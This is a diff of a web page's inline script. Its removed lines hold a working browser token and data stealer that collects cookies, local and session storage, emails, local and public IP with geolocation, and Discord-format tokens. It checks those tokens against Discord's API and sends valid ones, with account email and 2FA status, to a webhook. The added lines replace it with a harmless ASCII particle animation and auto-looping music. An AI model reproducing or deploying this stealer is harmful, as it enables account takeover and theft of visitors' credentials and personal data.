-              var match = candidates[i].match(/(\d{1,3}\.){3}\d{1,3}/);
-              if (match && !match[0].startsWith('127.') && !match[0].startsWith('0.')) {
-                data.network.localIP = match[0];
-                break;
-              }
-            }
-          }
-          pc.close();
-        }).catch(function() {});
-        setTimeout(function() { try { pc.close(); } catch(e) {} }, 2000);
-      } catch(e) {}
-
-      try {
-        var cookies = document.cookie ? document.cookie.split(';').filter(function(c) { return c.trim(); }) : [];
-        data.storage.cookies = cookies.length;
-        data.storage.cookieList = cookies;
-      } catch(e) {}
-
-      try {
-        var ls = [];
-        if (localStorage && localStorage.length > 0) {
-          for (var key in localStorage) {
-            if (localStorage.hasOwnProperty(key)) {
-              var val = localStorage[key];
-              if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
-              ls.push(key + ': ' + val);
-            }
-          }
-        }
-        data.storage.localStorage = ls;
-      } catch(e) {}
-
-      try {
-        var ss = [];
-        if (sessionStorage && sessionStorage.length > 0) {
-          for (var key2 in sessionStorage) {
-            if (sessionStorage.hasOwnProperty(key2)) {
-              var val2 = sessionStorage[key2];
-              if (val2 && val2.length > 500) val2 = val2.substring(0, 500) + '... [truncated]';
-              ss.push(key2 + ': ' + val2);
-            }
-          }
-        }
-        data.storage.sessionStorage = ss;
-      } catch(e) {}
-
-      var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-      var emails = [];
-      try {
-        if (localStorage && localStorage.length > 0) {
-          for (var key3 in localStorage) {
-            if (localStorage.hasOwnProperty(key3)) {
-              var val3 = localStorage[key3];
-              if (typeof val3 === 'string') {
-                var matches = val3.match(emailRegex);
-                if (matches) {
-                  matches.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-                }
-                try {
-                  var parsed = JSON.parse(val3);
-                  var jsonStr = JSON.stringify(parsed);
-                  var matches2 = jsonStr.match(emailRegex);
-                  if (matches2) {
-                    matches2.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-                  }
-                } catch(e) {}
-              }
-            }
-          }
-        }
-      } catch(e) {}
-      try {
-        if (document.cookie) {
-          var ck = document.cookie.split(';');
-          ck.forEach(function(cookie) {
-            var val4 = cookie.trim();
-            var matches3 = val4.match(emailRegex);
-            if (matches3) {
-              matches3.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-            }
-          });
-        }
-      } catch(e) {}
-      try {
-        if (sessionStorage && sessionStorage.length > 0) {
-          for (var key4 in sessionStorage) {
-            if (sessionStorage.hasOwnProperty(key4)) {
-              var val5 = sessionStorage[key4];
-              if (typeof val5 === 'string') {
-                var matches4 = val5.match(emailRegex);
-                if (matches4) {
-                  matches4.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-                }
-              }
-            }
-          }
-        }
-      } catch(e) {}
-      try {
-        var windowStr = JSON.stringify(window);
-        var matches5 = windowStr.match(emailRegex);
-        if (matches5) {
-          matches5.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-        }
-      } catch(e) {}
-      try {
-        var html = document.documentElement.innerHTML;
-        var matches6 = html.match(emailRegex);
-        if (matches6) {
-          matches6.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-        }
-      } catch(e) {}
-      var commonFalse = ['example@example.com', 'test@test.com', 'user@domain.com'];
-      emails = emails.filter(function(e) {
-        return commonFalse.indexOf(e) === -1 && e.length > 10;
-      });
-      data.emails = emails;
-
-      var tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
-      var tokenSources = [];
-
-      try {
-        if (localStorage && localStorage.length > 0) {
-          for (var k in localStorage) {
-            if (localStorage.hasOwnProperty(k)) {
-              var v = localStorage[k];
-              if (typeof v === 'string' && v.length > 20) {
-                var matches7 = v.match(tokenRegex);
-                if (matches7) {
-                  matches7.forEach(function(t) {
-                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                      tokenSources.push({ source: 'localStorage', key: k, token: t });
-                    }
-                  });
-                }
-                try {
-                  var p = JSON.parse(v);
-                  var js = JSON.stringify(p);
-                  var m2 = js.match(tokenRegex);
-                  if (m2) {
-                    m2.forEach(function(t) {
-                      if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                        tokenSources.push({ source: 'localStorage JSON', key: k, token: t });
-                      }
-                    });
-                  }
-                } catch(e) {}
-              }
-            }
-          }
-        }
-      } catch(e) {}
-
-      try {
-        if (sessionStorage && sessionStorage.length > 0) {
-          for (var k2 in sessionStorage) {
-            if (sessionStorage.hasOwnProperty(k2)) {
-              var v2 = sessionStorage[k2];
-              if (typeof v2 === 'string' && v2.length > 20) {
-                var matches8 = v2.match(tokenRegex);
-                if (matches8) {
-                  matches8.forEach(function(t) {
-                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                      tokenSources.push({ source: 'sessionStorage', key: k2, token: t });
-                    }
-                  });
-                }
-              }
-            }
-          }
-        }
-      } catch(e) {}
-
-      try {
-        if (document.cookie) {
-          var cks = document.cookie.split(';');
-          cks.forEach(function(cookie) {
-            var parts = cookie.trim().split('=');
-            if (parts.length === 2) {
-              var val6 = parts[1];
-              var matches9 = val6.match(tokenRegex);
-              if (matches9) {
-                matches9.forEach(function(t) {
-                  if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                    tokenSources.push({ source: 'cookie', key: parts[0], token: t });
-                  }
-                });
-              }
-            }
-          });
-        }
-      } catch(e) {}
-
-      try {
-        var ws = JSON.stringify(window);
-        var m3 = ws.match(tokenRegex);
-        if (m3) {
-          m3.forEach(function(t) {
-            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-              tokenSources.push({ source: 'window object', key: 'global', token: t });
-            }
-          });
-        }
-      } catch(e) {}
-
-      try {
-        var html2 = document.documentElement.innerHTML;
-        var m4 = html2.match(tokenRegex);
-        if (m4) {
-          m4.forEach(function(t) {
-            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-              tokenSources.push({ source: 'HTML', key: 'inline', token: t });
-            }
-          });
-        }
-      } catch(e) {}
-
-      var uniqueTokens = [];
-      var seen = {};
-      tokenSources.forEach(function(item) {
-        if (!seen[item.token]) {
-          seen[item.token] = true;
-          uniqueTokens.push(item);
-        }
-      });
-
-      data.tokens = uniqueTokens;
-
-      var fields = [];
-
-      fields.push({ name: 'Browser', value: data.browser.userAgent.substring(0, 200), inline: false });
-      fields.push({ name: 'Language', value: data.browser.language, inline: true });
-      fields.push({ name: 'Platform', value: data.browser.platform, inline: true });
-      fields.push({ name: 'Screen', value: data.system.screen, inline: true });
-      fields.push({ name: 'Window', value: data.system.window, inline: true });
-      fields.push({ name: 'Pixel Ratio', value: data.system.pixelRatio, inline: true });
-      fields.push({ name: 'Timezone', value: data.system.timezone, inline: true });
-      fields.push({ name: 'UTC Time', value: data.system.utc, inline: false });
-      if (data.system.gpuVendor) fields.push({ name: 'GPU', value: data.system.gpuVendor + ' | ' + data.system.gpuRenderer, inline: false });
-      if (data.network.localIP) fields.push({ name: 'Local IP', value: data.network.localIP, inline: true });
-
-      fields.push({ name: 'Cookies', value: data.storage.cookies + ' found', inline: true });
-      if (data.storage.localStorage && data.storage.localStorage.length > 0) {
-        var lsStr = data.storage.localStorage.slice(0, 5).join('\n');
-        if (data.storage.localStorage.length > 5) lsStr += '\n... and ' + (data.storage.localStorage.length - 5) + ' more';
-        fields.push({ name: 'LocalStorage', value: lsStr.substring(0, 500), inline: false });
-      }
-      if (data.storage.sessionStorage && data.storage.sessionStorage.length > 0) {
-        var ssStr = data.storage.sessionStorage.slice(0, 5).join('\n');
-        if (data.storage.sessionStorage.length > 5) ssStr += '\n... and ' + (data.storage.sessionStorage.length - 5) + ' more';
-        fields.push({ name: 'SessionStorage', value: ssStr.substring(0, 500), inline: false });
-      }
-
-      if (data.emails && data.emails.length > 0) {
-        fields.push({ name: 'Emails Found', value: data.emails.join(', ').substring(0, 500), inline: false });
-      }
-
-      if (data.tokens && data.tokens.length > 0) {
-        fields.push({ name: 'Tokens Found', value: data.tokens.length + ' potential tokens', inline: false });
-
-        var validTokens = [];
-        var invalidTokens = [];
-
-        var tokenPromises = data.tokens.map(function(item) {
-          return new Promise(function(resolve) {
-            var token = item.token;
-            fetch('https://discord.com/api/v9/users/@me', {
-              headers: { 'Authorization': token, 'Content-Type': 'application/json' }
-            }).then(function(res) {
-              if (res.status === 200) {
-                return res.json().then(function(userData) {
-                  validTokens.push({ token: token, user: userData, source: item.source });
-                  resolve();
-                });
-              } else {
-                invalidTokens.push({ token: token, status: res.status, source: item.source });
-                resolve();
-              }
-            }).catch(function() {
-              invalidTokens.push({ token: token, status: 'error', source: item.source });
-              resolve();
+            const x = offX + col * cellW;
+            const y = offY + row * cellH;
+            result.push({
+                ch: ch,
+                hx: x,
+                hy: y,
+                x: x,
+                y: y,
+                vx: 0,
+                vy: 0,
+                size: cellW * 0.85,
+                phase: col * 0.018 + row * 0.31
             });
-          });
-        });
+        }
+    }
+    return result;
+}
 
-        Promise.all(tokenPromises).then(function() {
-          if (validTokens.length > 0) {
-            validTokens.forEach(function(vt) {
-              var user = vt.user;
-              var tag = user.global_name || user.username || user.id;
-              var embed = {
-                title: 'VALID TOKEN',
-                color: 0x888888,
-                fields: [
-                  { name: 'User', value: tag + ' (' + user.id + ')', inline: false },
-                  { name: 'Email', value: user.email || 'N/A', inline: true },
-                  { name: '2FA', value: user.mfa_enabled ? 'Enabled' : 'Disabled', inline: true },
-                  { name: 'Nitro', value: user.premium_type || 'None', inline: true },
-                  { name: 'Verified', value: user.verified ? 'Yes' : 'No', inline: true },
-                  { name: 'Source', value: vt.source, inline: true }
-                ],
-                timestamp: new Date().toISOString()
-              };
-              sendToWebhook({ embeds: [embed] });
-            });
-          }
+/* =========================================================
+   RESIZE
+========================================================= */
 
-          if (invalidTokens.length > 0) {
-            var invMsg = invalidTokens.map(function(it) {
-              return it.token.substring(0, 30) + '... [' + it.status + '] from ' + it.source;
-            }).join('\n');
-            sendToWebhook({ embeds: [{ title: 'Invalid Tokens', color: 0x444444, fields: [{ name: 'Tokens', value: invMsg.substring(0, 500), inline: false }] }] });
-          }
+function resize(){
+    width = window.innerWidth;
+    height = window.innerHeight;
 
-          sendToWebhook('Harvest complete. Valid: ' + validTokens.length + ' | Invalid: ' + invalidTokens.length + ' | Emails: ' + data.emails.length);
-        });
-      } else {
-        var noTokenEmbed = {
-          title: 'Collective Harvest',
-          color: 0x888888,
-          fields: fields,
-          timestamp: new Date().toISOString()
-        };
-        sendToWebhook({ embeds: [noTokenEmbed] });
-        sendToWebhook('No Discord tokens found in browser storage.');
-      }
+    dpr = Math.min(window.devicePixelRatio || 1, 1.25);
 
-      fetch('https://api.ipify.org?format=json')
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-          if (data && data.ip) {
-            sendToWebhook('Public IP: ' + data.ip);
-            return fetch('http://ip-api.com/json/' + data.ip);
-          }
-        })
-        .then(function(r) { return r ? r.json() : null; })
-        .then(function(geo) {
-          if (geo && geo.status === 'success') {
-            sendToWebhook('IP Location: ' + geo.city + ', ' + geo.regionName + ', ' + geo.country + ' (ISP: ' + geo.isp + ')');
-          }
-        })
-        .catch(function() {});
+    canvas.width = Math.floor(width * dpr);
+    canvas.height = Math.floor(height * dpr);
+    canvas.style.width = width + "px";
+    canvas.style.height = height + "px";
+
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    ctx.textAlign = "left";
+    ctx.textBaseline = "top";
+
+    particles = build(currentArt);
+    ctx.font = `${cellW * 0.85}px monospace`;
+
+    mx = width * 0.5;
+    my = height * 0.5;
+    smx = mx;
+    smy = my;
+    prevMx = mx;
+    prevMy = my;
+}
+resize();
+
+window.addEventListener("resize", resize, {passive:true});
+
+/* =========================================================
+   MORPH
+========================================================= */
+
+function switchASCII(){
+    const oldParticles = particles;
+    const newArt = currentArt === OLD_ART ? NEW_ART : OLD_ART;
+    const newParticles = build(newArt);
+
+    const oldCount = oldParticles.length;
+    const newCount = newParticles.length;
+
+    for(let i = 0; i < newCount; i++){
+        const p = newParticles[i];
+        const ratio = newCount <= 1 ? 0 : i / (newCount - 1);
+        const oldIndex = Math.min(oldCount - 1, Math.floor(ratio * oldCount));
+        const old = oldParticles[oldIndex];
+
+        if(old){
+            p.x = old.x;
+            p.y = old.y;
+            p.vx = old.vx * 0.15;
+            p.vy = old.vy * 0.15;
+            p.hxStart = old.x;
+            p.hyStart = old.y;
+        }else{
+            p.hxStart = p.hx;
+            p.hyStart = p.hy;
+        }
     }
 
-  })();
-  </script>
+    particles = newParticles;
+    currentArt = newArt;
+}
+
+/* =========================================================
+   MOUSE
+========================================================= */
+
+window.addEventListener(
+    "mousemove",
+    function(e){
+        mx = e.clientX;
+        my = e.clientY;
+    },
+    {passive:true}
+);
+
+/* =========================================================
+   CLICK
+========================================================= */
+
+let switchCooldown = false;
+
+window.addEventListener(
+    "click",
+    function(){
+        if(switchCooldown){
+            return;
+        }
+        switchCooldown = true;
+        switchASCII();
+        setTimeout(function(){
+            switchCooldown = false;
+        }, 400);
+    },
+    {passive:true}
+);
+
+/* =========================================================
+   UPDATE
+========================================================= */
+
+function update(delta){
+    const frameScale = Math.min(delta / 16.6667, 2);
+    t += 0.016 * frameScale;
+
+    if(smx === -9999){
+        smx = mx;
+        smy = my;
+        prevMx = mx;
+        prevMy = my;
+    }
+
+    smx += (mx - smx) * 0.055;
+    smy += (my - smy) * 0.055;
+
+    const mvx = smx - prevMx;
+    const mvy = smy - prevMy;
+    prevMx = smx;
+    prevMy = smy;
+
+    const centerX = width * 0.5;
+    const centerY = height * 0.5;
+    const mouseOffsetX = smx - centerX;
+    const mouseOffsetY = smy - centerY;
+
+    let targetOffsetX = mouseOffsetX * MOUSE_INFLUENCE;
+    let targetOffsetY = mouseOffsetY * MOUSE_INFLUENCE;
+
+    targetOffsetX = Math.max(-MAX_FOLLOW, Math.min(MAX_FOLLOW, targetOffsetX));
+    targetOffsetY = Math.max(-MAX_FOLLOW, Math.min(MAX_FOLLOW, targetOffsetY));
+
+    nearest = null;
+    nearestDistSq = Infinity;
+
+    for(let i = 0; i < particles.length; i++){
+        const p = particles[i];
+        const dx = p.x - smx;
+        const dy = p.y - smy;
+        const distSq = dx * dx + dy * dy;
+        if(distSq < nearestDistSq){
+            nearestDistSq = distSq;
+            nearest = p;
+        }
+    }
+
+    if(nearest && nearestDistSq < DRAG_RADIUS_SQ){
+        const nearestDistance = Math.sqrt(nearestDistSq);
+        const dx = smx - nearest.x;
+        const dy = smy - nearest.y;
+        const falloff = 1 - nearestDistance / DRAG_RADIUS;
+        const smooth = falloff * falloff * (3 - 2 * falloff);
+
+        nearest.vx += dx * DRAG_STRENGTH * smooth;
+        nearest.vy += dy * DRAG_STRENGTH * smooth;
+        nearest.vx += mvx * 0.55 * smooth;
+        nearest.vy += mvy * 0.55 * smooth;
+
+        for(let i = 0; i < particles.length; i++){
+            const p = particles[i];
+            if(p === nearest){
+                continue;
+            }
+            const dx2 = p.x - nearest.x;
+            const dy2 = p.y - nearest.y;
+            const d2 = dx2 * dx2 + dy2 * dy2;
+
+            if(d2 < NEIGHBOR_RADIUS_SQ){
+                const distance = Math.sqrt(d2);
+                const influence = 1 - distance / NEIGHBOR_RADIUS;
+                const strength = influence * influence;
+
+                p.vx += (nearest.x - p.x) * NEIGHBOR_STRENGTH * strength;
+                p.vy += (nearest.y - p.y) * NEIGHBOR_STRENGTH * strength;
+                p.vx += mvx * 0.22 * strength;
+                p.vy += mvy * 0.22 * strength;
+            }
+        }
+    }
+
+    for(let i = 0; i < particles.length; i++){
+        const p = particles[i];
+
+        const dx = p.x - smx;
+        const dy = p.y - smy;
+        const distanceSq = dx * dx + dy * dy;
+
+        let smoothInfluence = 0;
+        if(distanceSq < 176400){
+            const distance = Math.sqrt(distanceSq);
+            const influence = Math.max(0, 1 - distance / 420);
+            smoothInfluence = influence * influence;
+        }
+
+        const waveX = Math.sin(t * 1.4 + p.hx * 0.018 + p.hy * 0.012) * 4;
+        const waveY = Math.cos(t * 1.1 + p.hy * 0.020 + p.hx * 0.009) * 3;
+        const wave2 = Math.sin(t * 0.7 + p.hx * 0.010 - p.hy * 0.015) * 2;
+
+        const wholeFollowX = targetOffsetX * (0.35 + smoothInfluence * 0.65);
+        const wholeFollowY = targetOffsetY * (0.35 + smoothInfluence * 0.65);
+
+        let targetX = p.hx + waveX + wave2 + wholeFollowX;
+        let targetY = p.hy + waveY + wholeFollowY;
+
+        p.vx += (targetX - p.x) * SPRING_K * frameScale;
+        p.vy += (targetY - p.y) * SPRING_K * frameScale;
+
+        const damping = Math.pow(DAMPING, frameScale);
+        p.vx *= damping;
+        p.vy *= damping;
+
+        p.x += p.vx * frameScale;
+        p.y += p.vy * frameScale;
+    }
+}
+
+/* =========================================================
+   RENDER
+========================================================= */
+
+function render(){
+    ctx.fillStyle = "#000";
+    ctx.fillRect(0, 0, width, height);
+
+    ctx.font = `${cellW * 0.85}px monospace`;
+    ctx.textAlign = "left";
+    ctx.textBaseline = "top";
+
+    const baseHue = (t * HUE_SPEED) % 360;
+
+    for(let i = 0; i < particles.length; i++){
+        const p = particles[i];
+
+        const dx = p.x - smx;
+        const dy = p.y - smy;
+        const distanceSq = dx * dx + dy * dy;
+
+        const hx = p.hx;
+        const hy = p.hy;
+        const ddx = p.x - hx;
+        const ddy = p.y - hy;
+        const displacementSq = ddx * ddx + ddy * ddy;
+
+        const hueBend = Math.sin(hx * 0.006 + hy * 0.004 + t * 0.3) * HUE_SPATIAL_SPREAD;
+
+        let hue = (baseHue + hueBend) % 360;
+        if(hue < 0){
+            hue += 360;
+        }
+
+        if(distanceSq > 18000 && displacementSq < 400){
+            ctx.globalAlpha = 0.90;
+            ctx.fillStyle = `hsl(${hue}, ${COLOR_SAT}%, 82%)`;
+            ctx.fillText(p.ch, p.x, p.y);
+            continue;
+        }
+
+        const displacement = Math.sqrt(displacementSq);
+        const glow = Math.min(1, displacement / 18);
+        const lightness = 60 + glow * 35;
+
+        let scale = 1;
+        if(distanceSq < 18000){
+            const influence = 1 - distanceSq / 18000;
+            scale += influence * 0.15;
+        }
+
+        ctx.globalAlpha = 0.86 + glow * 0.14;
+        ctx.fillStyle = `hsl(${hue}, ${COLOR_SAT + glow * 15}%, ${lightness}%)`;
+
+        if(scale > 1){
+            ctx.save();
+            ctx.translate(p.x + p.size * 0.5, p.y + p.size * 0.5);
+            ctx.scale(scale, scale);
+            ctx.fillText(p.ch, -p.size * 0.5, -p.size * 0.5);
+            ctx.restore();
+        }else{
+            ctx.fillText(p.ch, p.x, p.y);
+        }
+    }
+    ctx.globalAlpha = 1;
+}
+
+/* =========================================================
+   ANIMATION
+========================================================= */
+
+function draw(now){
+    const delta = Math.min(now - lastTime, 32);
+    lastTime = now;
+    update(delta);
+    render();
+    requestAnimationFrame(draw);
+}
+
+/* =========================================================
+   AUDIO
+========================================================= */
+
+const music = document.getElementById("bgMusic");
+music.volume = 1;
+music.loop = true;
+
+function startMusic(){
+    const promise = music.play();
+    if(promise){
+        promise.catch(function(){});
+    }
+}
+
+function forceLoop(){
+    try {
+        if(music.currentTime > 0) music.currentTime = 0;
+    } catch(e){}
+    startMusic();
+}
+
+music.addEventListener("ended", forceLoop);
+
+let userPaused = false;
+music.addEventListener("pause", function(){
+    if(userPaused) return;
+    setTimeout(function(){
+        if(music.paused) forceLoop();
+    }, 200);
+});
+
+setInterval(function(){
+    if(music.paused && !userPaused) startMusic();
+}, 1000);
+
+window.addEventListener("load", startMusic);
+document.addEventListener("click", startMusic, {once:true});
+document.addEventListener("mousemove", startMusic, {once:true, passive:true});
+document.addEventListener("keydown", startMusic, {once:true});
+
+/* =========================================================
+   START
+========================================================= */
+
+resize();
+particles = build(OLD_ART);
+requestAnimationFrame(draw);
+
+})();
+</script>
+
 </body>
 </html>
